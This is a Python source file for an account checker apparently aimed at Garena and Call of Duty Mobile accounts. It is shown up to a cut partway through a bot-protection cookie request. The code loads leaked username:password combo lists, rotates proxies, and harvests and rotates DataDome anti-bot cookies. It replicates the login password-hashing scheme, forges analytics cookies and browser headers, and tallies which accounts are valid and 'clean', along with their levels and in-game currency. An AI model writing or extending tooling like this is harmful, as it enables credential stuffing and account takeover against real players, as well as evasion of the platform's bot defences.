######UPDATED BY @RvSteff

import hashlib
import json
import logging
import threading
import random
import os
import re
import sys
import time
import urllib.parse
import math
import uuid
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock, Event, local
from collections import deque
import signal
from threading import Lock

print_lock = Lock()
import colorama
import requests
from Crypto.Cipher import AES

colorama.init(autoreset=True)

import colorama
import requests
from Crypto.Cipher import AES

from rich.console import Console

colorama.init(autoreset=True)

console = Console()

RED = '\033[38;2;255;0;85m'
GREEN = '\033[38;2;57;255;20m'
CYAN = '\033[38;2;0;255;255m'
YELLOW = '\033[38;2;255;255;0m'
MAGENTA = '\033[38;2;218;112;214m'
BLUE = '\033[38;2;0;150;255m'
WHITE = '\033[38;2;248;248;255m'
ORANGE = '\033[38;2;255;165;0m'
BRIGHT_BLACK = '\033[38;2;105;105;105m'
GRAY = '\033[38;2;128;128;128m'
RESET = '\033[0m'

FILE_LOCK = Lock()
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
    
        
CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'}
}

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES = False
GAME_FILE_MAP = {
    'CODM': 'CODM.txt',
    'FREEFIRE': 'FreeFire.txt',
    'FREE FIRE': 'FreeFire.txt',
    'ROV': 'ROV.txt',
    'DELTA FORCE': 'DeltaForce.txt',
    'AOV': 'AOV.txt',
    'SPEED DRIFTERS': 'SpeedDrifters.txt',
    'BLACK CLOVER M': 'BlackCloverM.txt',
    'GARENA UNDAWN': 'Undawn.txt',
    'FC ONLINE': 'FCOnline.txt',
    'FC ONLINE M': 'FCOnlineM.txt',
    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
    'FAST THRILL': 'FastThrill.txt',
    'THE WORLD OF WAR': 'WorldOfWar.txt'
}

GAME_DISPLAY_NAMES = [
    ('CODM', 'CODM'),
    ('FREEFIRE', 'Free Fire'),
    ('ROV', 'ROV'),
    ('DELTA FORCE', 'Delta Force'),
    ('AOV', 'AOV'),
    ('SPEED DRIFTERS', 'Speed Drifters'),
    ('BLACK CLOVER M', 'Black Clover M'),
    ('GARENA UNDAWN', 'Undawn'),
    ('FC ONLINE', 'FC Online'),
    ('FC ONLINE M', 'FC Online M'),
    ('MOONLIGHT BLADE', 'Moonlight Blade'),
    ('FAST THRILL', 'Fast Thrill'),
    ('THE WORLD OF WAR', 'World of War')
]


OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

def get_display_width(text):
    """Get display width of text (strips ANSI codes)"""
    plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', text)
    return len(plain_text)

def format_size(size_bytes):
    """Format file size in human readable format"""
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def get_unique_progress_bar(count, total, length=30):
    """Get a colored progress bar"""
    if total == 0:
        progress = 0
    else:
        progress = count / total
    filled_length = int(length * progress)
    bar = '█' * filled_length + '░' * (length - filled_length)
    if progress < 0.33:
        color = RED
    elif progress < 0.66:
        color = YELLOW
    else:
        color = GREEN
    return f"{color}{bar}{RESET}"

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def add_indent(text, spaces=8):
    """Add indentation to text"""
    prefix = " " * spaces
    return "\n".join(prefix + line for line in text.split("\n"))

def _w(n=72):
    """Get terminal width"""
    try:
        cols = os.get_terminal_size((80, 24)).columns
        return min(cols - 4, n)
    except:
        return min(72, n)

def _strip_rich(text):
    """Strip rich formatting"""
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def _ts():
    """Get current timestamp"""
    return datetime.now().strftime('%H:%M:%S')

def _kv(key, val, kc=None, vc=None, kw=18):
    """Print key-value pair"""
    kc = kc or GRAY
    vc = vc or WHITE
    clean_val = _strip_rich(str(val))
    print(f'  {kc}{key:<{kw}}{RESET}  {vc}{clean_val}{RESET}')

def _abox_open(title, bc=None, tc=None, w=None):
    """Open a box with title"""
    bc = bc or CYAN
    tc = tc or WHITE
    bw = w or _w(66)
    t = _strip_rich(title)
    tp = max(0, bw - len(t) - 1)
    print(f"  {bc}┏{'━' * (bw + 2)}┓{RESET}")
    print(f"  {bc}┃{RESET} {tc}{t}{RESET}{' ' * tp} {bc}┃{RESET}")
    print(f"  {bc}┣{'━' * (bw + 2)}┫{RESET}")

def _abox_row(key, val, vc=None, bc=None, kw=18, w=None):
    """Print a row in a box"""
    bc = bc or CYAN
    vc = vc or WHITE
    bw = w or _w(66)
    k = f'{GRAY}{key:<{kw}}{RESET}'
    v = f'{vc}{_strip_rich(str(val))}{RESET}'
    vis = kw + len(_strip_rich(str(val)))
    pad = max(0, bw - vis - 1)
    print(f"  {bc}┃{RESET} {k} {v}{' ' * pad} {bc}┃{RESET}")

def _abox_sep(bc=None, w=None):
    """Print a separator in a box"""
    bc = bc or CYAN
    bw = w or _w(66)
    print(f"  {bc}┠{'─' * (bw + 2)}┨{RESET}")

def _abox_close(bc=None, w=None):
    """Close a box"""
    bc = bc or CYAN
    bw = w or _w(66)
    print(f"  {bc}┗{'━' * (bw + 2)}┛{RESET}")

def _log(level: str, msg: str, indent: str = '  '):
    """Print a log message with icon"""
    log_icons = {
        'INFO': (CYAN, 'ℹ'),
        'SUCCESS': (GREEN, '✔'),
        'WARNING': (YELLOW, '⚠'),
        'ERROR': (RED, '✖'),
        'DEBUG': (GRAY, '·'),
        'REQUEST': (CYAN, '→'),
        'RESPONSE': (CYAN, '←'),
        'RETRY': (YELLOW, '↺'),
        'PROXY': (MAGENTA, '⬡'),
        'THREAD': (MAGENTA, '⧫'),
        'SAVE': (GREEN, '⬇')
    }
    col, icon = log_icons.get(level, (GRAY, '·'))
    ts = _ts()
    clean = _strip_rich(msg)
    print(f'{indent}{GRAY}[{ts}]{RESET}  {col}{icon}{RESET}  {clean}')


def display_banner():
    clear_screen()
    
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.align import Align
    from rich.columns import Columns
    from rich.table import Table
    from rich import box
    
    console = Console()
    
    def get_prop(prop):
        try:
            return subprocess.check_output(["getprop", prop], text=True, stderr=subprocess.DEVNULL).strip() or "Unknown"
        except:
            return "Unknown"
    
    try:
        brand, model, dev_name = get_prop("ro.product.brand").upper(), get_prop("ro.product.model"), get_prop("ro.product.marketname")
        dev_name = dev_name if dev_name != "Unknown" else model
        chipset = get_prop("ro.board.platform")
        chipset = chipset if chipset != "Unknown" else get_prop("ro.hardware")
        android_ver, build = get_prop("ro.build.version.release"), get_prop("ro.build.display.id")
    except:
        dev_name, brand, model = platform.node() or "Unknown", "Unknown", "Unknown"
        chipset, android_ver, build = platform.machine(), platform.release(), platform.version()
    
    logo = r"""
██╗   ██╗██╗███╗   ██╗ ██████╗███████╗
██║   ██║██║████╗  ██║██╔════╝██╔════╝
██║   ██║██║██╔██╗ ██║██║     █████╗
╚██╗ ██╔╝██║██║╚██╗██║██║     ██╔══╝
 ╚████╔╝ ██║██║ ╚████║╚██████╗███████╗
  ╚═══╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝


 ██████╗ ██████╗ ██████╗ ███╗   ███╗
██╔════╝██╔═══██╗██╔══██╗████╗ ████║
██║     ██║   ██║██║  ██║██╔████╔██║
██║     ██║   ██║██║  ██║██║╚██╔╝██║
╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║
 ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝
"""
    
    logo_text = Text(logo, style="bold red")
    title = Text(" VINCE CODM \n", style="bold cyan") + Text("POWERED BY VINCE", style="bold yellow")
    
    header = Panel(Align.center(title), border_style="yellow", padding=(1,5))
    
    device = Table(box=box.ROUNDED, expand=True, border_style="cyan")
    device.add_column("SYSTEM", style="bold magenta")
    device.add_column("VALUE", style="bold green")
    
    for key, value in [(" DEVICE", dev_name), (" BRAND", brand), (" MODEL", model), 
                      (" CHIPSET", chipset), (" ANDROID", android_ver), (" BUILD", build)]:
        device.add_row(key, re.sub(r'[^\x20-\x7E]', '', str(value)).strip()[:40])
    
    device_panel = Panel(device, title="[bold cyan]DEVICE INFORMATION[/bold cyan]", border_style="green", padding=(1,2))
    logo_panel = Panel(Align.center(logo_text), title="[bold red]VINCE CODM[/bold red]", border_style="red", padding=(1,2))
    footer = Panel(Align.center("[bold green]✓ SYSTEM READY[/bold green]\n[cyan]CODM VALIDATION ENGINE ONLINE[/cyan]"), 
                   border_style="cyan", padding=(1,3))
    
    console.print(header)
    console.print(Columns([logo_panel, device_panel], equal=False, expand=True))
    console.print(footer)
    print()

GARENA_UI_HEIGHT = 11

def build_live_stats_ui(stats):
    from rich.panel import Panel
    from rich.table import Table
    from rich.columns import Columns
    from rich.console import Group
    from rich.progress import Progress, BarColumn, TextColumn
    from rich import box
    import re
    
    def s(key, default=0):
        if isinstance(stats, dict):
            return stats.get(key, default)
        mapping = {"valid": "valid_count", "invalid": "invalid_count", "clean": "clean_count", 
                  "not_clean": "not_clean_count", "checked": "checked_count", "total": "total_accounts",
                  "has_codm": "has_codm_count", "no_codm": "no_codm_count", "high_lvl": "highest_clean_level",
                  "high_shell": "highest_shell", "elapsed": "elapsed", "level_distribution": "level_distribution",
                  "region_distribution": "region_distribution", "country_distribution": "country_distribution"}
        return getattr(stats, mapping.get(key, key), default)
    

    account_table = Table(box=box.ROUNDED, expand=True, border_style="cyan")
    account_table.add_column("STATUS", style="bold cyan")
    account_table.add_column("COUNT", justify="right")
    for label, color in [("VALID", "green"), ("INVALID", "red"), ("CLEAN", "bright_green"), ("NOT CLEAN", "bright_red")]:
        account_table.add_row(label, f"[{color}]{s(label.lower().replace(' ', '_'))}[/{color}]")
    account_table.add_row("CHECKED", f"[cyan]{s('checked')}/{s('total')}[/cyan]")
    account_panel = Panel(account_table, title="[bold cyan]ACCOUNTS[/bold cyan]", border_style="cyan")
    
    
    codm_table = Table(box=box.ROUNDED, expand=True, border_style="magenta")
    codm_table.add_column("DETAIL", style="bold yellow")
    codm_table.add_column("VALUE", justify="right")
    for label, key, color in [("HAS CODM", "has_codm", "cyan"), ("NO CODM", "no_codm", "yellow"),
                             ("HIGH LEVEL", "high_lvl", "magenta"), ("HIGH SHELL", "high_shell", "bright_yellow")]:
        codm_table.add_row(label, f"[{color}]{s(key)}[/{color}]")
    codm_table.add_row("TIME", f"[white]{s('elapsed'):.2f}s[/white]")
    codm_panel = Panel(codm_table, title="[bold magenta]CODM DETAILS[/bold magenta]", border_style="magenta")
    
    
    level_table = Table(box=box.ROUNDED, expand=True, border_style="green")
    level_table.add_column("LEVEL", style="bold green")
    level_table.add_column("COUNT", justify="right")
    level_dist = s("level_distribution", {})
    for r in ("1-50", "51-100", "101-150", "151-200", "201-250", "251-300", "301-350", "351-400"):
        level_table.add_row(f"Lv. {r}", f"[cyan]{level_dist.get(r, 0)}[/cyan]")
    level_panel = Panel(level_table, title="[bold green]LEVEL DISTRIBUTION[/bold green]", border_style="green")
    
    
    region_table = Table(box=box.ROUNDED, expand=True, border_style="yellow")
    region_table.add_column("REGION", style="bold yellow")
    region_table.add_column("COUNT", justify="right")
    

    region_dist = s("region_distribution", {})
    
   
    if not region_dist or not isinstance(region_dist, dict):
     
        country_dist = s("country_distribution", {})
        if isinstance(country_dist, dict) and country_dist:
         
            region_dist = {}
            for code, count in country_dist.items():
                code_upper = code.upper()
                region_info = CODM_REGIONS.get(code_upper, {})
                if region_info:
                    region_name = region_info.get('name', code_upper)
                    flag = region_info.get('flag', '')
                    display = f"{flag} {region_name}" if flag else region_name
                else:
                    display = code_upper
                region_dist[display] = region_dist.get(display, 0) + count
    
    if isinstance(region_dist, dict) and region_dist:
        for region, count in sorted(region_dist.items(), key=lambda x: x[1], reverse=True)[:10]:
            region_table.add_row(region, f"[cyan]{count}[/cyan]")
    else:
        region_table.add_row("No Data", "[cyan]0[/cyan]")
    
    region_panel = Panel(region_table, title="[bold yellow]🌍 REGION DISTRIBUTION[/bold yellow]", border_style="yellow")
    

    progress = Progress(TextColumn("[cyan]{task.description}"), BarColumn(), TextColumn("[green]{task.percentage:>5.1f}%"))
    progress.add_task("Checking Accounts", total=max(s("total"), 1), completed=s("checked"))
    progress_panel = Panel(progress, title="[bold green]PROGRESS[/bold green]", border_style="green", box=box.ROUNDED)
    
    return Group(Columns([account_panel, codm_panel], expand=True), 
                Columns([level_panel, region_panel], expand=True),
                progress_panel)


def display_summary(total_checked, failed, valid, categorized_levels, countries, original_total, 
                   highest_clean=0, highest_not_clean=0, highest_shells=0):
    from rich.console import Console, Group
    from rich.panel import Panel
    from rich.table import Table
    from rich.columns import Columns
    from rich import box
    import re
    
    console = Console()
    total = max(original_total, 1)
    
    def make_bar(label, value, color, maximum=total):
        width, percent = 22, value / maximum if maximum else 0
        filled, empty = int(width * percent), width - int(width * percent)
        bar = f"[{color}]" + ("█" * filled) + "[/]" + ("░" * empty)
        return f"[bold white]{label:<14}[/bold white]{bar} [bold {color}]{percent*100:5.1f}%[/bold {color}]"
    
    result_panel = Panel(Group(make_bar("VALID", valid, "green"), make_bar("FAILED", failed, "red"), 
                              make_bar("CHECKED", total_checked, "cyan")), 
                        title="[bold cyan]📊 CHECKING RESULT[/bold cyan]", border_style="cyan", box=box.ROUNDED)
    
    level_group = Group()
    for name, key, color in [("LV 1-49", "1-49", "blue"), ("LV 50-99", "50-99", "cyan"), 
                            ("LV 100-199", "100-199", "green"), ("LV 200-299", "200-299", "yellow"), 
                            ("LV 300-400", "300-400", "magenta")]:
        level_group.renderables.append(make_bar(name, categorized_levels.get(key, 0), color))
    
    level_panel = Panel(level_group, title="[bold yellow]🏆 LEVEL DISTRIBUTION[/bold yellow]", 
                       border_style="yellow", box=box.ROUNDED)
    
    country_counts = {}
    for c in countries:
        country = re.sub(r"\s*\([^)]*\)", "", c).strip()
        country_counts[country] = country_counts.get(country, 0) + 1
    
    country_group = Group()
    for country, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
        country_group.renderables.append(make_bar(country[:12], count, "magenta"))
    
    country_panel = Panel(country_group, title="[bold magenta]🌍 COUNTRIES[/bold magenta]", 
                         border_style="magenta", box=box.ROUNDED)
    
    peak = Table(box=box.ROUNDED, expand=True)
    peak.add_column("TYPE", style="cyan")
    peak.add_column("VALUE", justify="right")
    peak.add_row("🔥 Highest CHECK ACCOUNT LEVEL", f"[green]Level {highest_clean}[/green]")
    peak.add_row("⚠ Highest Not Clean", f"[red]Level {highest_not_clean}[/red]")
    peak.add_row("💰 Highest Shell", f"[yellow]{highest_shells}[/yellow]")
    peak_panel = Panel(peak, title="[bold green]🔥 PEAK STATS[/bold green]", border_style="green", box=box.ROUNDED)
    
    console.print(Panel("[bold yellow]𝐅𝐈𝐍𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐌𝐌𝐀𝐑𝐘[/bold yellow]", border_style="yellow"))
    console.print(Columns([result_panel, peak_panel], expand=True))
    console.print(level_panel)
    if countries:
        console.print(country_panel)
    print()

def find_and_list_account_files():
    """Find and display all account files in Combo folder using Rich UI"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    
    combo_dir = "Combo"
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        return None
    
    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    line_count = sum(1 for line in f if line.strip())
                file_details.append((file_path, os.path.getsize(file_path), line_count))
            except:
                pass
    
    if not file_details:
        return None
    
    console = Console()
    table = Table(box=box.ROUNDED, expand=True, border_style="cyan")
    table.add_column("NO.", justify="center", style="bold yellow")
    table.add_column("FILENAME", style="bold white")
    table.add_column("SIZE", justify="right", style="bold yellow")
    table.add_column("LINES", justify="right", style="bold green")
    
    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
        if len(name) > 35:
            name = name[:32] + "..."
        table.add_row(f"[yellow][ {i} ][/yellow]", name, format_size(size), f"{count:,}")
    
    console.print()
    console.print(Panel(table, title="[bold cyan]📂 SELECT A COMBO FILE[/bold cyan]", 
                       subtitle="[bold green]VINCE CODM[/bold green]", border_style="cyan", padding=(1,2)))
    console.print()
    
    return [item[0] for item in file_details]

def prompt_for_duplicate_removal(file_path):
    """Prompt user to remove duplicates from file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        original_count = len(lines)
        unique_lines = list(dict.fromkeys([line for line in lines if line.strip()]))
        duplicates_removed = original_count - len(unique_lines)
        if duplicates_removed > 0:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(unique_lines)
            _log('SUCCESS', f'Removed {duplicates_removed} duplicate line(s).')
        else:
            _log('INFO', 'No duplicates were found.')
    except Exception as e:
        _log('ERROR', f'Error during duplicate removal: {e}')

def select_input_file_flow(show_auto_remove=False):
    """Complete file selection flow with prompts"""
    selected_file_path = None
    while True:
        available_files = find_and_list_account_files()
        if available_files:
            try:
                choice_str = input(f"  {GRAY}➤{YELLOW} SELECT COMBO FILE [1-{len(available_files)}] : {WHITE}").strip()
                print(RESET, end="")
                if not choice_str:
                    continue
                file_choice = int(choice_str) - 1
                if 0 <= file_choice < len(available_files):
                    selected_file_path = available_files[file_choice]
                    break
                else:
                    _log('ERROR', 'Invalid number.')
                    time.sleep(1)
            except (ValueError, IndexError):
                _log('ERROR', 'Invalid input.')
                time.sleep(1)
        else:
            input(f"  {YELLOW}No combo found in 'Combo' folder. Press Enter to refresh...{RESET}")
            
    dup_choice = input(f"  {GRAY}➤{YELLOW} REMOVE DUPLICATE LINES? [Y/N] : {WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file_path)
        
    if show_auto_remove:
        auto_choice = input(f"  {GRAY}➤{YELLOW} AUTO-REMOVE CHECKED LINES? [Y/N] : {WHITE}").strip()
        print(RESET, end="")
        print()
        return selected_file_path, (auto_choice.lower() == 'y')
        
    print()
    return selected_file_path


def sanitize_string(text):
    """Sanitize string to ASCII"""
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    """Clean an account line"""
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    """Format CODM region code"""
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    """Format mobile number with masking"""
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str
        
def _sigint_handler(sig, frame):
    print(f'\n  {YELLOW}⚠  Ctrl+C – exiting immediately…{RESET}')
    os._exit(0)

signal.signal(signal.SIGINT, _sigint_handler)

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': CYAN,
        'INFO': CYAN,
        'WARNING': YELLOW,
        'ERROR': RED,
        'CRITICAL': RED
    }
    ICONS = {
        'DEBUG': '⊡',
        'INFO': 'ℹ',
        'WARNING': '⚠',
        'ERROR': '✖',
        'CRITICAL': '☠'
    }
    RESET = RESET

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)



class ProxyManager:
    def __init__(self, proxy_file='proxies.txt'):
        self.proxies = []
        self._index = 0
        self._lock = threading.Lock()
        self._load(proxy_file)

    _VALID_SCHEMES = ('http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h')

    def _parse_line(self, line):
        """Parse a single proxy line into a requests-style proxy dict."""
        scheme = 'http'
        rest = line
        if '://' in line:
            scheme, rest = line.split('://', 1)
            scheme = scheme.strip().lower()
            if scheme not in self._VALID_SCHEMES:
                _log('WARNING', f"Unknown proxy scheme '{scheme}' in line, defaulting to http")
                scheme = 'http'
            if '@' in rest:
                creds, hostport = rest.rsplit('@', 1)
                user, _, passwd = creds.partition(':')
            else:
                hostport = rest
                user = passwd = None
            host, _, port = hostport.partition(':')
            if not host or not port:
                return None
        else:
            parts = rest.split(':')
            if len(parts) == 4:
                host, port, user, passwd = parts
            elif len(parts) == 2:
                host, port = parts
                user = passwd = None
            elif '@' in rest:
                try:
                    creds, hostport = rest.rsplit('@', 1)
                    user, passwd = creds.split(':', 1)
                    host, port = hostport.split(':', 1)
                except Exception:
                    return None
            else:
                return None

        if user and passwd:
            url = f'{scheme}://{urllib.parse.quote(user, safe="")}:{urllib.parse.quote(passwd, safe="")}@{host}:{port}'
        else:
            url = f'{scheme}://{host}:{port}'
        return {'http': url, 'https': url}

    def _load(self, proxy_file):
        if not os.path.exists(proxy_file):
            return
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                proxy_dict = self._parse_line(line)
                if proxy_dict:
                    self.proxies.append(proxy_dict)
        if self.proxies:
            random.shuffle(self.proxies)

    def get_next(self):
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
        return proxy

    def is_loaded(self):
        return len(self.proxies) > 0

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {
        '_ga': f'GA1.1.{random_id}.{timestamp}',
        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'
    }
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies


_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    
    headers = {
        'host': 'datadome.garena.com', 
        'sec-ch-ua-platform': '"Android"', 
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36', 
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"', 
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1', 
        'accept': '*/*', 
        'origin': 'https://sso.garena.com', 
        'sec-fetch-site': 'same-site', 
        'sec-fetch-mode': 'cors', 
        'sec-fetch-dest': 'empty', 
        'referer': 'https://sso.garena.com/', 
        'accept-encoding': 'gzip, deflate, br, zstd', 
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8', 
        'priority': 'u=1, i'
    }
    
    payload = {
